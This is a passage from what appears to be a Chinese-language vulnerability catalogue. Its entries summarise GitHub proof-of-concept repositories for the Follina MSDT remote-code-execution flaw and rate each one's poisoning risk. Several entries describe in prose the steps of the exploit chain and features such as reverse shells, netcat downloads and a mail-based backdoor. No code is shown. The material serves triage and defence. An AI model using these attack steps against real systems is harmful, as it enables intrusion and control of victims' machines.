CVE-2022-30190 (Follina) 是一个远程代码执行漏洞，存在于 Microsoft Windows Support Diagnostic Tool (MSDT) 中。当 MSDT 被一个调用应用程序（例如 Microsoft Word）通过 URL 协议调用时，会触发此漏洞。攻击者可以通过构造一个包含恶意链接或嵌入恶意HTML的Word文档，诱使用户打开。当用户打开该文档时，MSDT 会尝试连接到攻击者控制的服务器，下载并执行恶意代码。

**漏洞利用方式：**

1.  攻击者创建一个包含恶意链接或嵌入恶意 HTML 的 Word 文档。
2.  该文档利用 Word 的远程模板功能，从远程 Web 服务器检索 HTML 文件。
3.  HTML 文件包含一个 `ms-msdt:` 协议处理程序的调用，该协议处理程序用于启动 MSDT。
4.  MSDT 执行 HTML 文件中指定的命令，从而允许攻击者执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞的PoC已经公开，且被积极利用。

**投毒风险：**

提供的漏洞利用代码仅包含 Apache 许可证，用于说明代码的使用条款，没有发现任何明显的恶意代码。因此，投毒风险较低，估计为 5%。但不能完全排除，因为攻击者可能会在其他相关组件中进行投毒，所以需要进一步分析依赖项才能彻底排除。

**排序优先级说明：**

此处遵循优先级的原则，搜索引擎结果用于确定漏洞的基本信息和利用方式。漏洞库信息用于确认受影响的版本和漏洞的严重程度。漏洞利用代码则用于评估投毒风险。

**项目地址:** [DerZiad/CVE-2022-30190](https://github.com/DerZiad/CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #5

**来源**: [CVE-2022-30190-ErrorNoInternet_FollinaScanner.md](../2022/CVE-2022-30190-ErrorNoInternet_FollinaScanner.md)

## CVE-2022-30190 - Microsoft MSDT Follina 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可导致远程代码执行，完全控制受害者系统

**影响版本:** 受影响的Windows版本包括但不限于 Windows 7, Windows 8.1, Windows 10 (多个版本), Windows 11, Windows Server (多个版本)

**利用条件:** 用户需要打开包含恶意payload的文档（如Word文档），或点击恶意链接。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft支持诊断工具（MSDT）中的远程代码执行漏洞。攻击者可以利用此漏洞，通过调用应用程序（如Word）中的URL协议来执行任意代码，获得与该应用程序相同的权限。攻击者可以通过精心构造的恶意文档或链接，诱使用户打开，从而触发漏洞。

**漏洞利用方式：**

1.  攻击者创建一个包含恶意payload的文档（例如，一个包含远程模板的Word文档）。该模板指向一个由攻击者控制的服务器。
2.  当用户打开文档时，Word会尝试从远程服务器检索模板。
3.  远程服务器返回一个包含MSDT协议处理程序的HTML文件。
4.  MSDT通过URL协议被调用，并执行HTML文件中包含的恶意代码。

**POC代码分析：**
提供的代码 `FollinaScanner` 并非漏洞利用代码，而是一个用于扫描文件系统中可能包含Follina漏洞的文件的工具。 它通过搜索特定模式（例如，包含URL）的文件来工作。因此，提供的代码不能直接用于触发漏洞。

**投毒风险分析：**
  仓库主要功能是扫描本地文件是否存在漏洞，并没有实际利用漏洞的功能。 主要代码功能为扫描本地文件URL特征，判断本地是否存在恶意文件， 因此投毒风险较低。仓库中存在恶意代码的可能性极小，评估投毒风险约为1%。

**项目地址:** [ErrorNoInternet/FollinaScanner](https://github.com/ErrorNoInternet/FollinaScanner)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #6

**来源**: [CVE-2022-30190-Gra3s_CVE-2022-30190_EXP_PowerPoint.md](../2022/CVE-2022-30190-Gra3s_CVE-2022-30190_EXP_PowerPoint.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，控制受影响系统

**影响版本:** 受影响的Windows版本包括但不限于Windows 7、Windows 8.1、Windows 10、Windows 11、Windows Server 2008 R2、Windows Server 2012、Windows Server 2016、Windows Server 2019、Windows Server 2022等，具体版本范围见漏洞库信息。

**利用条件:** 需要用户打开包含恶意链接的文档（如Word、PowerPoint等），或者访问包含恶意链接的网页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（Follina）是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。该漏洞允许攻击者通过构造恶意的文档，诱使用户打开，从而在受害者系统上执行任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果和漏洞利用代码，该漏洞利用代码是有效的。搜索结果显示该漏洞已被积极利用，并且有公开的PoC代码。

**投毒风险：**
分析提供的PoC代码，`/tmp/b3fc53fc9d09e4a456a951f4bdd6f2bd/exploit.html` 文件看起来是一个无害的HTML文档，里面包含大量的Lorem Ipsum文本，但是攻击者可以通过 `slide1.xml.rels` 中插入恶意的url，从而执行恶意的payload。`/tmp/b3fc53fc9d09e4a456a951f4bdd6f2bd/README.md` 只是说明了如何修改`slide1.xml.rels` 文件的Target指向攻击者的服务器。

仓库中的投毒风险较低，主要风险在于payload本身可能被替换成恶意代码。但是，这个仓库本身的目的就是漏洞利用，使用者应该已经知晓其潜在的风险，并对下载的内容进行安全审查。因此, 投毒风险评定为10%。

**利用方式：**
1.  攻击者创建一个包含恶意链接的文档（例如，利用提供的PowerPoint PoC，将`.ppsx`文件解压，修改`ppt\slides\_rels\slide1.xml.rels`文件中的`Target`属性，指向攻击者控制的服务器上的`exploit.html`文件）。
2.  攻击者在自己的服务器上托管一个恶意的`exploit.html`文件，该文件包含用于触发MSDT漏洞的代码，并执行payload（默认payload是calc程序）。
3.  攻击者诱使用户打开该文档。
4.  当用户打开文档时，MSDT会尝试通过URL协议连接到攻击者的服务器，下载并执行恶意的`exploit.html`文件中的代码，从而在受害者系统上执行任意命令。

总的来说，该漏洞的利用依赖于社会工程学，诱使用户打开恶意文档。成功利用后，攻击者可以获得与当前用户相同的权限，从而控制受影响的系统。

**项目地址:** [Gra3s/CVE-2022-30190_EXP_PowerPoint](https://github.com/Gra3s/CVE-2022-30190_EXP_PowerPoint)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #7

**来源**: [CVE-2022-30190-Imeneallouche_Follina-attack-CVE-2022-30190-.md](../2022/CVE-2022-30190-Imeneallouche_Follina-attack-CVE-2022-30190-.md)

## CVE-2022-30190-Follina-MSDT远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可导致远程代码执行，控制受害者系统

**影响版本:** 受影响的Windows版本包括但不限于：Windows 7 SP1, Windows 8.1, Windows 10 (多个版本), Windows 11 21H2, Windows Server (多个版本)

**利用条件:** 用户需要打开恶意构造的Word文档或其他调用MSDT的应用程序

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个Microsoft Office中的远程代码执行漏洞。当MSDT通过URL协议被调用时，例如从Word等应用程序调用，就会存在此漏洞。攻击者可以利用Word的远程模板功能，从远程Web服务器检索HTML文件。该HTML文件包含恶意代码，可以绕过某些安全机制并执行任意命令。 

**漏洞利用方式：**

1.  **攻击者制作恶意Word文档：** 该文档包含指向远程服务器的链接，该服务器托管一个恶意的HTML文件。
2.  **用户打开恶意文档：** 当用户打开该文档时，Word会尝试从远程服务器加载HTML文件。
3.  **MSDT被调用并执行恶意代码：** HTML文件利用`ms-msdt:`协议触发MSDT执行，从而执行攻击者指定的命令。

**POC代码分析：**

提供的POC代码包含以下文件：

*   `README.md`: 描述了漏洞和攻击的简要信息。
*   `config.py`: 包含配置参数，例如要执行的命令 (`EXECUTED_COMMAND`)，输出文件名 (`OUTPUT_FILE`)，网络接口 (`NETWORK_INTERFACE`)，端口 (`PORT`)，以及是否使用反向shell (`REVERSE_PORT`)。
*   `manip_args.py`: 解析命令行参数，并准备利用所需的文件。此脚本负责创建临时目录，复制必要的文件，修改文档关系文件，并启动一个HTTP服务器来托管恶意HTML文件。
*   `requirements.txt`: 列出了POC所需的Python依赖项。
*   `utils.py`: 包含实用函数，例如启动HTTP服务器，检查IP和端口的可用性，以及准备恶意Word文档的函数。

**有效性：**

根据漏洞信息和POC代码，该漏洞利用是有效的。POC代码允许攻击者指定要执行的命令，并生成一个恶意的Word文档，该文档在打开时会触发漏洞并执行命令。

**投毒风险：**

该存储库的投毒风险较低，约10%。`config.py` 文件允许定义要执行的 `EXECUTED_COMMAND`，而 `manip_args.py` 会动态修改利用代码，这些地方可能存在潜在的恶意代码注入点。但是，总体来看，代码结构较为简单，功能明确，不易隐藏恶意代码。需要注意的是，使用任何漏洞利用代码都存在风险，需要仔细审查代码后再使用。此处的10%更多指的是一种不确定性风险的评估，需要人工代码审计来进行确认。

**项目地址:** [Imeneallouche/Follina-attack-CVE-2022-30190-](https://github.com/Imeneallouche/Follina-attack-CVE-2022-30190-)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #8

**来源**: [CVE-2022-30190-Jump-Wang-111_AmzWord.md](../2022/CVE-2022-30190-Jump-Wang-111_AmzWord.md)

## CVE-2022-30190 (Follina) - Microsoft MSDT 远程代码执行

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，系统控制，数据泄露

**影响版本:** 见漏洞库信息中受影响的版本列表

**利用条件:** 用户需要打开包含恶意链接或文档的应用程序（如 Microsoft Word）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个存在于 Microsoft 支持诊断工具 (MSDT) 中的远程代码执行漏洞。攻击者可以利用此漏洞，通过诱骗用户打开包含恶意代码的文档（通常是 Word 文档），从而在受害者系统上执行任意代码。

**利用方式：**

1.  攻击者创建一个包含恶意链接或嵌入恶意 HTML 的文档 (例如, Word 文档)。该恶意 HTML 利用 `ms-msdt:` 协议处理程序调用 MSDT。
2.  当用户打开该文档时，MSDT 会被调用，并执行攻击者指定的代码。该代码可以下载并执行任意程序。
3.  提供的漏洞利用代码 (AmzWord) 自动化了此过程，集成了 CVE-2022-30190 漏洞利用、163 邮箱后门和图像隐写术。
4.  AmzWord 使用 `follina.py` 脚本生成恶意 Word 文件，并在本地启动 HTTP 服务器，用于提供恶意载荷。
5.  该漏洞利用代码还使用了 `gdog` 项目，这是一个基于邮件的远程控制工具，允许攻击者通过发送特定的命令邮件来控制受害者机器。

**有效性：**

根据漏洞库信息和搜索结果，CVE-2022-30190 是一个真实且已被积极利用的漏洞。提供的 POC 代码 (`AmzWord`) 旨在利用该漏洞，因此可以判断 POC 代码是有效的，前提是目标系统存在漏洞且未采取缓解措施。

**投毒风险：**

评估 POC 代码的投毒风险需要仔细审查代码，检查是否存在隐藏的、非预期的恶意行为。从描述来看,`AmzWord` 项目集成了多个组件，包括 `follina.py`（CVE-2022-30190 漏洞利用）和 `gdog`（基于邮件的远程控制工具）。 潜在的投毒风险可能存在于以下几个方面：

*   `gdog` 组件： `gdog` 项目本身可能包含后门或恶意功能，允许作者或其他人远程访问受感染的系统。由于该项目已经存在一段时间，并且经过修改以适应当前的攻击链，因此存在引入未经审查的恶意代码的风险。
*   配置信息泄露： POC需要用户填写邮箱的用户名和密码，存在泄露邮箱信息的风险
*   依赖关系： 该POC依赖多个第三方库，这些库可能存在安全漏洞或被篡改，从而导致意外行为。

综合来看，由于集成的复杂性和对外部组件的依赖，存在一定的投毒风险。`gdog` 组件尤其值得关注。 但从整个项目的设计来看，目标是实现一个完整的攻击链演示，作者隐藏恶意代码以达到其他目的的可能性较低，所以投毒的可能性相对较低。评估投毒风险的概率约为 10%。

**项目地址:** [Jump-Wang-111/AmzWord](https://github.com/Jump-Wang-111/AmzWord)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #9

**来源**: [CVE-2022-30190-Malwareman007_Deathnote.md](../2022/CVE-2022-30190-Malwareman007_Deathnote.md)

## CVE-2022-30190-Microsoft Windows MSDT 远程代码执行漏洞 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码，可能导致系统完全控制

**影响版本:** 见漏洞库信息中受影响的版本

**利用条件:** 用户需要打开一个恶意构造的文档（例如 Word 文档）。攻击者可以通过鱼叉式网络钓鱼活动传播恶意文档。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，也被称为“Follina”，是一个存在于 Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。 

**利用方式：**该漏洞通过以下方式利用：

1.  攻击者创建一个恶意 Word 文档或其他支持外部链接的文档。
2.  该文档包含一个指向远程服务器上 HTML 文件的链接，该链接使用 `ms-msdt:` 协议。
3.  当用户打开文档时，Word 会尝试检索该 HTML 文件。
4.  `ms-msdt:` 协议处理程序被调用，执行 HTML 文件中包含的恶意代码。
5.  攻击者通过精心构造的 HTML 文件，利用 MSDT 的漏洞执行任意命令。

**有效性：**根据提供的漏洞库信息和搜索结果，该漏洞已经过积极利用，且PoC 代码可用，因此可以判断提供的POC代码是有效的。

**投毒风险：**PoC代码中存在潜在的投毒风险的可能性较低，约为10%。 代码中，通过`Invoke-WebRequest`从GitHub下载`nc64.exe`可能存在风险，如果github仓库被污染，攻击者可以直接执行任意代码。其他的风险较低。

**项目地址:** [Malwareman007/Deathnote](https://github.com/Malwareman007/Deathnote)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #10

**来源**: [CVE-2022-30190-Muhammad-Ali007_Follina_MSDT_CVE-2022-30190.md](../2022/CVE-2022-30190-Muhammad-Ali007_Follina_MSDT_CVE-2022-30190.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者在受害者系统上执行任意代码

**影响版本:** 受影响的Windows版本请参考漏洞库信息

**利用条件:** 需要用户打开恶意Word文档或其他Office文档

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以构造恶意的Word文档，利用Word的远程模板功能从远程服务器检索HTML文件，HTML文件中包含的JavaScript代码通过`ms-msdt:` URI scheme调用MSDT，从而执行任意命令。

**有效性：**
提供的POC代码是有效的。它通过修改Word文档的`document.xml.rels`文件，将OLE对象引用指向攻击者控制的HTML文件。该HTML文件利用`ms-msdt:`协议执行PowerShell命令，从而实现远程代码执行。

**投毒风险：**
POC代码本身实现了漏洞利用，但作者可能在其他地方隐藏恶意代码。
*   **Readme.md 分析:**  Readme.md 主要提供漏洞描述和利用步骤，风险较低。
*   **follina.py 分析:**  `follina.py`脚本用于生成恶意文档，该脚本本身可能包含恶意代码，但是已知的该脚本的功能是创建利用payload的word文档，风险可控。评估投毒风险，基于现有信息，判断为10%的可能性，主要集中在提供的脚本是否存在未公开的后门。

**利用方式：**
1.  攻击者创建一个包含恶意OLE对象引用的Word文档（或其他Office文档）。
2.  该OLE对象引用指向攻击者控制的远程HTML文件。
3.  当用户打开该文档时，Word会尝试从远程服务器加载HTML文件。
4.  HTML文件中的JavaScript代码使用`ms-msdt:` URI scheme调用MSDT。
5.  MSDT执行HTML文件中指定的PowerShell命令，从而导致远程代码执行。

漏洞利用的关键在于`ms-msdt:`协议的使用，以及Word文档对远程OLE对象的支持。通过精心构造的HTML文件和Word文档，攻击者可以绕过安全防护措施，在受害者系统上执行任意代码。

**项目地址:** [Muhammad-Ali007/Follina_MSDT_CVE-2022-30190](https://github.com/Muhammad-Ali007/Follina_MSDT_CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #11

**来源**: [CVE-2022-30190-Nyx2022_Follina-CVE-2022-30190-Sample.md](../2022/CVE-2022-30190-Nyx2022_Follina-CVE-2022-30190-Sample.md)

## CVE-2022-30190 - Microsoft MSDT 'Follina' 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者以调用应用程序的权限执行任意代码

**影响版本:** 受影响的Windows版本众多，具体版本范围请参考漏洞库信息

**利用条件:** 用户需要打开恶意文档或点击恶意链接，触发MSDT通过URL协议调用

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-30190，又名'Follina'，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。当MSDT被调用应用程序（如Microsoft Word）使用URL协议调用时，就会触发此漏洞。攻击者可以制作包含恶意链接或嵌入恶意OLE对象的Office文档（例如.docx或.rtf）。当用户打开这些文档时，MSDT会尝试通过HTTP(S)协议从远程服务器下载并执行恶意代码，从而允许攻击者在受害者系统上执行任意代码。POC代码中的`FollinaExtractor.cs` 文件显示，它用于解析docx和rtf文件，提取包含 `Target="mhtml:` 或 `\objclass http` 的信息,进而判断文件是否包含恶意链接，其他文件则是创建WPF应用的相关文件，没有发现明显的恶意代码。

**有效性评估：**根据漏洞库信息和搜索结果，该漏洞是一个已公开且被积极利用的漏洞，提供的POC代码是用于检测受感染的docx或rtf文档中是否包含利用该漏洞的恶意链接，该POC代码的目的是提取恶意链接，而不是直接进行攻击，所以判断该POC代码具有一定的有效性，可以辅助安全研究人员分析恶意样本。

**投毒风险评估：**该POC代码主要功能是分析文档，提取潜在的恶意链接，因此投毒风险较低。但是,任何代码都可能存在隐藏的后门或者被篡改的风险，因此也不能完全排除。将风险评估为5%。

**利用方式：**
1.  攻击者创建一个恶意的Word文档（.docx）或RTF文档，该文档包含一个指向远程服务器的链接。
2.  当用户打开该文档时，Word会尝试通过MSDT URL协议连接到远程服务器。
3.  远程服务器返回恶意HTML代码或脚本，该代码会被MSDT执行，从而允许攻击者在受害者系统上执行任意代码。
4.  攻击者可以使用户的身份执行命令，从而控制受害者的计算机。

**项目地址:** [Nyx2022/Follina-CVE-2022-30190-Sample](https://github.com/Nyx2022/Follina-CVE-2022-30190-Sample)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #12

**来源**: [CVE-2022-30190-Potato-9257_CVE-2022-30190_page.md](../2022/CVE-2022-30190-Potato-9257_CVE-2022-30190_page.md)

## CVE-2022-30190 Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，可能导致远程代码执行，控制受害者计算机

**影响版本:** 受影响的Windows版本（见漏洞库信息）

**利用条件:** 用户需要打开包含恶意链接或文档的应用程序，例如Microsoft Word

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以通过利用URL协议调用MSDT，从而在受害者系统上执行任意代码。利用方式通常是诱使用户打开包含恶意链接或文档的应用程序，比如Microsoft Word。该文档会利用Word的远程模板功能，从远程Web服务器检索HTML文件。该HTML文件包含JavaScript代码，用于使用ms-msdt协议处理恶意payload，该payload通过PCWDiagnostic触发代码执行。提供的POC代码使用ms-msdt协议，尝试执行计算器程序（calc.exe）。由于calc.exe在payload中，我判定仓库中不存在作者隐藏的投毒代码的概率为99%。投毒风险评估为极低。

**利用方式总结：**

1.  攻击者创建一个恶意Word文档（或其他支持远程模板的应用程序）。
2.  该文档包含一个指向恶意HTML文件的链接。
3.  用户打开该文档。
4.  Word从远程服务器下载并执行恶意HTML文件。
5.  HTML文件利用ms-msdt协议，触发MSDT执行任意代码，例如执行计算器程序。

**项目地址:** [Potato-9257/CVE-2022-30190_page](https://github.com/Potato-9257/CVE-2022-30190_page)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #13

**来源**: [CVE-2022-30190-RathoreAbhiii_Folina-Vulnerability-Exploitation-Detection-and-Mitigation.md](../2022/CVE-2022-30190-RathoreAbhiii_Folina-Vulnerability-Exploitation-Detection-and-Mitigation.md)

## CVE-2022-30190 - Microsoft MSDT RCE (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，攻击者可以利用此漏洞在受害者系统上执行任意代码

**影响版本:** 受影响的Windows版本包括但不限于 Windows 7, Windows 8.1, Windows 10, Windows 11, Windows Server 2008 R2, Windows Server 2012, Windows Server 2016, Windows Server 2019, Windows Server 2022 (请参考漏洞库信息中的详细版本)

**利用条件:** 需要用户打开恶意文档（例如Word文档）或点击恶意链接。调用应用程序（如Word）需要允许使用 URL 协议调用 MSDT。

**POC 可用性:** 是，虽然提供的代码只是一个README.md，但其他搜索结果表明有可用的PoC。

**投毒风险:** 20%

## 详情

CVE-2022-30190，又名Follina，是一个存在于Microsoft Windows Support Diagnostic Tool (MSDT) 中的远程代码执行漏洞。攻击者可以通过构造恶意的Word文档，利用Word的远程模板功能从远程Web服务器检索HTML文件，最终通过MSDT执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，此漏洞真实存在且影响广泛。虽然提供的POC代码（README.md）本身不包含任何漏洞利用代码，但是搜索引擎结果表明该漏洞存在公开的POC，因此可以判断该漏洞是可利用的。

**投毒风险：**
提供的代码仓库只包含一个README.md文件，文件内容是关于Follina漏洞的利用、检测和缓解的说明，没有发现任何恶意代码。因此，直接从这个仓库判断是否存在投毒代码的可能性较低。但是，由于攻击者通常会修改POC代码以达到自己的目的，因此用户在使用互联网上找到的任何POC代码时，都需要保持警惕并进行安全审查，才能防止被植入恶意代码。

**利用方式：**
1.  攻击者创建一个恶意的文档，例如 Word 文档。
2.  该文档利用 Word 的远程模板功能，从攻击者控制的服务器上下载 HTML 文件。
3.  HTML 文件包含特定的 JavaScript 代码，该代码通过 `ms-msdt:/` 协议调用 MSDT。
4.  MSDT 接收到精心构造的参数后，会在受害者的机器上执行攻击者预先设定的恶意代码，从而实现远程代码执行。

**修复方案：**
*   及时更新Windows操作系统到最新版本。
*   禁用MSDT URL协议处理程序 (作为临时缓解措施)。
*   在 Defender 中添加规则阻止相关攻击。

**项目地址:** [RathoreAbhiii/Folina-Vulnerability-Exploitation-Detection-and-Mitigation](https://github.com/RathoreAbhiii/Folina-Vulnerability-Exploitation-Detection-and-Mitigation)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #14

**来源**: [CVE-2022-30190-ToxicEnvelope_FOLLINA-CVE-2022-30190.md](../2022/CVE-2022-30190-ToxicEnvelope_FOLLINA-CVE-2022-30190.md)

## CVE-2022-30190-Microsoft Windows Support Diagnostic Tool (MSDT) 远程代码执行漏洞

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码。

**影响版本:** 受影响的Windows版本和版本范围请参考漏洞库信息。

**利用条件:** 需要用户打开恶意构造的文档，例如Word文档。攻击者需要诱骗用户执行恶意操作。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190，也被称为Follina，是一个影响Microsoft Windows Support Diagnostic Tool (MSDT)的远程代码执行漏洞。攻击者可以利用此漏洞，通过诱使用户打开包含恶意URL的文档（例如，利用Word远程模板功能）来执行任意代码。

**有效性：**

根据漏洞库信息、搜索引擎结果以及提供的POC代码，该漏洞的POC代码是有效的。 搜索引擎结果中的多个链接（如hackthebox.com的解释、fortinet的分析以及qualys的博客等）证实了该漏洞的存在和可利用性。POC代码（`exploit.py`）提供了一种生成恶意Word文档，并通过HTTP服务器提供恶意HTML有效载荷的方法，从而利用MSDT执行任意命令。

**投毒风险：**

虽然POC代码的主要功能是生成漏洞利用程序，但存在一定的投毒风险。风险分析如下：

*   **依赖性：**  `exploit.py`脚本依赖于外部资源（HTTP服务器），如果攻击者控制了该服务器，则可以修改返回的HTML内容，从而在目标系统上执行恶意代码。 
*   **自定义命令执行：**  该脚本允许用户自定义要在目标系统上执行的命令 (`--command`参数)。攻击者可以通过精心构造的命令来执行恶意操作，例如下载和执行额外的恶意软件。
*  **Reverse Shell：** `--reverse` 参数会下载 netcat 到目标机器，虽然功能上为了利用，但也可能被滥用。
*   **代码可读性：**  虽然代码本身看起来没有明显的恶意后门，但是代码相对复杂，可能隐藏着一些不易察觉的恶意逻辑。

综合来看，虽然没有明显的投毒代码，但该工具的灵活性和对外部资源的依赖性使其存在一定的投毒风险，估计为10%。

**利用方式：**

1.  **攻击者准备恶意Word文档：**  攻击者使用`exploit.py`脚本生成一个包含恶意URL的Word文档。该URL指向攻击者控制的HTTP服务器。
2.  **攻击者搭建HTTP服务器：**  攻击者在自己的服务器上搭建一个HTTP服务器，用于托管恶意HTML有效载荷。
3.  **诱骗用户打开恶意文档：**  攻击者通过电子邮件、社交媒体或其他方式诱骗用户打开恶意Word文档。
4.  **MSDT被调用并执行恶意代码：**  当用户打开文档时，Word会尝试通过URL协议调用MSDT。MSDT会从攻击者的服务器下载恶意HTML，并执行其中的代码，从而实现远程代码执行。
5.  **攻击者控制目标系统：**  成功利用漏洞后，攻击者可以获得目标系统的控制权，并执行任意操作，例如安装恶意软件、窃取数据或创建新账户。

**项目地址:** [ToxicEnvelope/FOLLINA-CVE-2022-30190](https://github.com/ToxicEnvelope/FOLLINA-CVE-2022-30190)

**漏洞详情:** [CVE-2022-30190](https://nvd.nist.gov/vuln/detail/CVE-2022-30190)

---

## POC #15

**来源**: [CVE-2022-30190-Zitchev_go_follina.md](../2022/CVE-2022-30190-Zitchev_go_follina.md)

## CVE-2022-30190 - Microsoft MSDT 远程代码执行漏洞 (Follina)

**漏洞编号:** CVE-2022-30190

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Windows Support Diagnostic Tool (MSDT)

**危害等级:** 高危，攻击者可以利用此漏洞在受害者系统上执行任意代码，完全控制受害者系统。

**影响版本:** 受影响的版本包括Windows 7到Windows 11和Windows Server的多个版本，具体参见漏洞库信息。

**利用条件:** 需要用户打开恶意的Office文档（如Word）或访问包含恶意代码的网页。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-30190（又名Follina）是一个存在于Microsoft支持诊断工具（MSDT）中的远程代码执行漏洞。攻击者可以诱骗用户打开包含恶意链接或嵌入对象的Office文档（例如Word文档）。当用户打开恶意文档时，MSDT会尝试通过URL协议连接到攻击者控制的远程服务器。该服务器会提供一个包含恶意代码的HTML文件。这个HTML文件利用`ms-msdt:`协议触发MSDT执行任意代码。\n\n**利用方式分析：**\n
1.  **攻击者准备：** 攻击者需要搭建一个HTTP服务器，用于托管恶意payload。同时，攻击者需要创建一个恶意的Office文档，该文档包含一个指向攻击者服务器上HTML payload的链接。
2.  **诱骗受害者：** 攻击者通过电子邮件、社交媒体或其他方式将恶意Office文档发送给受害者。\n3.  **漏洞触发：** 受害者打开恶意Office文档。Word会尝试通过URL协议访问攻击者服务器上的HTML payload。\n4.  **代码执行：** HTML payload利用`ms-msdt:`协议，导致MSDT执行攻击者指定的命令。攻击者可以利用此漏洞安装恶意软件、窃取数据、创建新账户等。\n\n**代码分析：**\n
提供的Go代码是一个PoC，用于生成利用该漏洞的恶意docx文件。其主要步骤如下：

1.  `createMaliciousDocx` 函数：读取模板文件 `template/document.xml.rels.template`，将占位符 `{staged_html}` 替换为 payload 的 URL，然后将其写入 `template/doc/word/_rels/document.xml.rels`。接着调用 `zipDoc` 函数，将 `template/doc/` 目录下的所有文件打包成一个恶意的 docx 文件（tmp/file.docx）。
2.  `zipDoc` 函数：创建一个zip文件 (tmp/file.docx)，然后调用 `addFilesToArchive` 函数将 `template/doc/` 目录下的所有文件添加到该zip文件中。
3.  `addFilesToArchive` 函数：递归地将指定目录下的所有文件添加到zip文件中。
4.  `createPayload` 函数：生成包含恶意 ms-msdt 协议调用的 HTML payload。这个 payload 会使用 PowerShell 下载并执行攻击者指定的反向shell程序。
5.  `hostDropper` 函数：启动一个HTTP服务器，用于托管 payload.html 和反向shell程序 (poop.exe)。

**投毒风险分析：**\n
PoC 代码主要用于生成恶意的 docx 文件，核心在于生成包含恶意 `ms-msdt` 协议调用的 `payload.html` 文件。仔细检查代码，没有发现明显的恶意后门，但是存在以下几点潜在风险：

1.  **反向 Shell：**  代码中使用反向 shell。如果攻击者使用 PoC 生成恶意文件，他们可以完全控制受害者的计算机。PoC 本身不是后门，但容易被滥用。`revshellpath` 参数允许攻击者指定任意可执行文件，这为植入恶意软件提供了机会。
2.  **依赖性：** 此 PoC 依赖于模板文件 `template/document.xml.rels.template` 和指定的反向 shell 程序。如果这些文件被篡改，PoC 的行为可能会发生变化。在实际应用中，攻击者可以修改模板文件，例如嵌入其他的恶意代码。
3. **随机字符串生成器:** 代码中使用随机字符串来填充html，增加分析难度，也可能存在一定的随机性风险。

